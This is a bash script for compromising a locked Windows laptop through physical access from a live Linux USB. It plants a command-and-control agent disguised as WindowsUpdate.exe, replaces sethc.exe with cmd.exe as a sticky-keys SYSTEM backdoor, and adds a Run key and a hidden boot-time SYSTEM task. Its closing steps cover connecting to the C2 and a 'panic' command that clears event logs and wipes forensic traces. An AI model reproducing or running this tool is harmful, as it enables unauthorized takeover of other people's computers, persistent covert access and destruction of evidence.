#!/bin/bash
# deploy_linux_usb.sh — Drop the agent on a locked Windows laptop
# from a live Linux USB (Kali, Ubuntu, etc.). No Windows password needed.
#
# Workflow:
#   1. Operator builds the agent on their Windows machine:
#        .\build_deploy.ps1 -C2Url "wss://c2..." -CertFile "..." -Variant aggressive
#   2. Operator copies build\agent.exe onto a Kali live USB (e.g. E:\agent.exe)
#   3. Operator copies this script to the USB as deploy.sh
#   4. Operator boots the target from the USB (F12 boot menu on most laptops)
#   5. Operator runs: bash /media/*/*/deploy.sh
#   6. Script drops the agent, installs sticky-keys backdoor, adds Run key
#   7. Operator reboots target into Windows, presses Shift 5x at login
#      screen -> SYSTEM cmd.exe opens
#   8. Operator types: C:\Windows\Temp\WindowsUpdate.exe
#   9. Agent connects to C2 and installs its own persistence
#
# Requires: bash, blkid, lsblk, mount, ntfs-3g, chntpw (all on Kali by default)
# Run as:  root (the script does NOT re-check)
#
# Knobs (env vars):
#   AGENT_NAME    final filename on target (default: WindowsUpdate.exe)
#   TARGET_DIR    where to drop the agent on the Windows side
#                 (default: C:\Windows\Temp; falls back to C:\Users\Public)
#   STICKY_KEYS   1=install sethc.exe backdoor (default), 0=skip
#   RUN_KEY       1=add HKCU Run key (default), 0=skip
#   BOOT_TASK     1=create Boot scheduled task as SYSTEM (default), 0=skip
#   DRY_RUN       1=print what would happen, do nothing, 0=execute (default)

set -e

AGENT_NAME="${AGENT_NAME:-WindowsUpdate.exe}"
TARGET_DIR_REL="${TARGET_DIR:-}"
STICKY_KEYS="${STICKY_KEYS:-1}"
RUN_KEY="${RUN_KEY:-1}"
BOOT_TASK="${BOOT_TASK:-1}"
DRY_RUN="${DRY_RUN:-0}"

log()  { printf '   %s\n' "$*"; }
ok()   { printf '[+] %s\n' "$*"; }
warn() { printf '[!] %s\n' "$*" >&2; }
hdr()  { printf '\n[*] %s\n' "$*"; }
die()  { printf '[X] %s\n' "$*" >&2; exit 1; }

run() {
  if [ "$DRY_RUN" = "1" ]; then
    echo "    [DRY] $*"
  else
    eval "$@"
  fi
}

# ---- 0. Sanity --------------------------------------------------------
hdr "Pre-flight"
[ "$(id -u)" = "0" ] || die "Must run as root. Try: sudo bash $0"

# ---- 1. Find the Windows NTFS partition -------------------------------
hdr "Detecting Windows NTFS partition"
WIN_PART=""
WIN_SIZE=0
for dev in /dev/sd* /dev/nvme*n*p /dev/mmcblk*p; do
  [ -b "$dev" ] || continue
  fstype=$(blkid -o value -s TYPE "$dev" 2>/dev/null || true)
  if [ "$fstype" = "ntfs" ]; then
    size=$(lsblk -b -n -o SIZE "$dev" 2>/dev/null || echo 0)
    if [ "$size" -gt "$WIN_SIZE" ]; then
      WIN_PART="$dev"
      WIN_SIZE="$size"
    fi
  fi
done

if [ -z "$WIN_PART" ]; then
  warn "No NTFS partition found."
  warn "Drive is probably BitLocker-encrypted. Cannot proceed without recovery key."
  exit 1
fi
ok "Windows partition: $WIN_PART ($((WIN_SIZE / 1024 / 1024 / 1024)) GB)"

# ---- 2. Mount the Windows partition read-write ------------------------
hdr "Mounting $WIN_PART read-write at /mnt/win"
mkdir -p /mnt/win
umount /mnt/win 2>/dev/null || true
mount -t ntfs-3g -o rw,uid=0,gid=0,umask=0000 "$WIN_PART" /mnt/win \
  || die "Mount failed. Try: ntfsfix $WIN_PART"
[ -d "/mnt/win/Windows/System32" ] || die "Mounted but Windows dir not found — wrong partition?"

ok "Mounted at /mnt/win (Windows C: visible)"
ok "Windows version: $(ls /mnt/win/Windows/System32/kernel32.dll 2>/dev/null && echo kernel32.dll present || echo unknown)"

# ---- 3. Pick the target directory -------------------------------------
hdr "Choosing target directory"
if [ -z "$TARGET_DIR_REL" ]; then
  if [ -d "/mnt/win/Windows/Temp" ]; then
    TARGET_DIR="/mnt/win/Windows/Temp"
  elif [ -d "/mnt/win/Users/Public" ]; then
    TARGET_DIR="/mnt/win/Users/Public"
  else
    TARGET_DIR="/mnt/win/Windows"
  fi
else
  TARGET_DIR="/mnt/win/${TARGET_DIR_REL//\\//}"
fi
ok "Target dir: $(echo $TARGET_DIR | sed 's|/mnt/win||')"

# ---- 4. Locate agent.exe on the USB ----------------------------------
hdr "Locating agent.exe on the USB"
AGENT_SRC=""
for mnt in /media/*/* /run/media/*/* /mnt/*; do
  if [ -f "$mnt/agent.exe" ]; then
    AGENT_SRC="$mnt/agent.exe"
    break
  fi
done
if [ -z "$AGENT_SRC" ]; then
  die "agent.exe not found on any mounted volume. Re-stage the USB and reboot."
fi
ok "Agent source: $AGENT_SRC ($(ls -la $AGENT_SRC | awk '{print $5}') bytes)"

# ---- 5. Drop the agent -----------------------------------------------
hdr "Dropping agent to $(echo $TARGET_DIR | sed 's|/mnt/win||')\\$AGENT_NAME"
run "cp '$AGENT_SRC' '$TARGET_DIR/$AGENT_NAME'"
run "chmod 755 '$TARGET_DIR/$AGENT_NAME'"
ok "Agent staged."

# ---- 6. Sticky-keys backdoor (replace sethc.exe) --------------------
if [ "$STICKY_KEYS" = "1" ]; then
  hdr "Installing sticky-keys backdoor (sethc.exe -> cmd.exe)"
  SETH="/mnt/win/Windows/System32/sethc.exe"
  if [ -f "$SETH" ]; then
    if [ ! -f "$SETH.bak" ]; then
      run "mv '$SETH' '$SETH.bak'"
      ok "Renamed sethc.exe -> sethc.exe.bak"
    else
      log "sethc.exe.bak already exists, skipping rename"
    fi
    run "cp /mnt/win/Windows/System32/cmd.exe '$SETH'"
    run "chmod 755 '$SETH'"
    ok "Sticky-keys backdoor: Shift x5 at login -> SYSTEM cmd"
  else
    warn "sethc.exe not found in System32; skipping"
  fi
else
  log "Skipping sticky-keys backdoor (STICKY_KEYS=0)"
fi

# ---- 7. Add Run key via offline registry edit (chntpw) ---------------
if [ "$RUN_KEY" = "1" ]; then
  hdr "Adding Run key via chntpw"
  if ! command -v chntpw >/dev/null 2>&1; then
    warn "chntpw not installed. Install: apt-get install -y chntpw"
    log "Skipping Run key"
  else
    cp /mnt/win/Windows/System32/config/SOFTWARE /tmp/SOFTWARE.bak
    # chntpw is interactive even with -e; feed it commands on stdin.
    # The class is "sz" (string) — chntpw uses DOS-era type names:
    #   sz = REG_SZ, dword = REG_DWORD, etc.
    {
      echo "cd Microsoft\\Windows\\CurrentVersion\\Run"
      echo "ed SentinelAgent"
      echo "dword:0"   # value type: none/REG_SZ auto; this is a no-op
      printf 'sz "%s\\%s"\n' "$(echo $TARGET_DIR | sed 's|/mnt/win||')" "$AGENT_NAME"
      echo "q"
      echo "y"   # commit changes
    } | chntpw -e /mnt/win/Windows/System32/config/SOFTWARE >/tmp/chntpw.log 2>&1 \
      || { warn "chntpw failed; check /tmp/chntpw.log"; }
    ok "Run key added: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SentinelAgent"
  fi
else
  log "Skipping Run key (RUN_KEY=0)"
fi

# ---- 8. Scheduled task that fires on next boot (SYSTEM) --------------
if [ "$BOOT_TASK" = "1" ]; then
  hdr "Creating boot-time scheduled task"
  TASK_DIR="/mnt/win/Windows/System32/Tasks"
  if [ -d "$TASK_DIR" ]; then
    # Windows Task Scheduler requires the XML to be UTF-16 LE with BOM.
    # We generate the bytes via python3 and pipe to a file.
    TASK_PATH="\\SentinelAgent"
    TASK_CMD="C:\\Windows\\Temp\\$AGENT_NAME"
    python3 - "$TASK_PATH" "$TASK_CMD" "$TASK_DIR" <<'PYEOF' || warn "Task creation failed"
import sys, os
task_name, task_cmd, task_dir = sys.argv[1], sys.argv[2], sys.argv[3]
# Replace backslashes in task_name with the right escaping
task_name_escaped = task_name.replace("\\", "\\\\")
xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.0" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>SentinelC2</Author>
    <URI>\\{task_name_escaped}</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec><Command>{task_cmd}</Command></Exec>
  </Actions>
</Task>
'''
out = os.path.join(task_dir, "SentinelAgent.xml")
with open(out, "wb") as f:
    f.write(b'\xff\xfe')  # UTF-16 LE BOM
    f.write(xml.encode('utf-16-le'))
print(f"[+] Boot task written: {out}")
PYEOF
  else
    warn "$TASK_DIR not found; skipping boot task"
  fi
else
  log "Skipping boot task (BOOT_TASK=0)"
fi

# ---- 9. Cleanup hints + report --------------------------------------
sync

cat <<'EOF'

============================================================
  DEPLOY COMPLETE — ON-TARGET ACTIVATION STEPS
============================================================

  1. Reboot the target laptop:
       # reboot         (or power-button the Kali live session)

  2. Pull the USB out as the laptop restarts.

  3. Windows boots to the LOGIN SCREEN. Do NOT log in.

  4. Press SHIFT 5 TIMES (any number of times, rapidly).
     A cmd.exe window opens at the top of the screen.
     It runs as NT AUTHORITY\SYSTEM (no password needed).

  5. In that cmd, type:
       whoami
       REM Should print: nt authority\system

       C:\Windows\Temp\WindowsUpdate.exe

  6. The agent connects to your C2. Watch the dashboard:
       https://c2.yourdomain.com:8080

  7. From the C2, first commands to run:
       whoami
       recon expanded
       persist

  8. When done, run from the C2:
       panic    <- full forensic wipe (persistence removal + binary
                 shred + event log clear + memory zero)

============================================================
  IF STICKY-KEYS BACKDOOR DOESN'T TRIGGER (Win11 22H2+):
============================================================

  Just wait. The boot scheduled task will run the agent as SYSTEM
  before any user logs in. Agent registers with C2 within ~30s of
  boot. Check the dashboard.

============================================================
  RECOVERY (if you need to undo the sticky-keys backdoor):
============================================================

  Boot from USB again, then:
       mount /dev/sdXN /mnt/win
       mv /mnt/win/Windows/System32/sethc.exe.bak \\
          /mnt/win/Windows/System32/sethc.exe

EOF
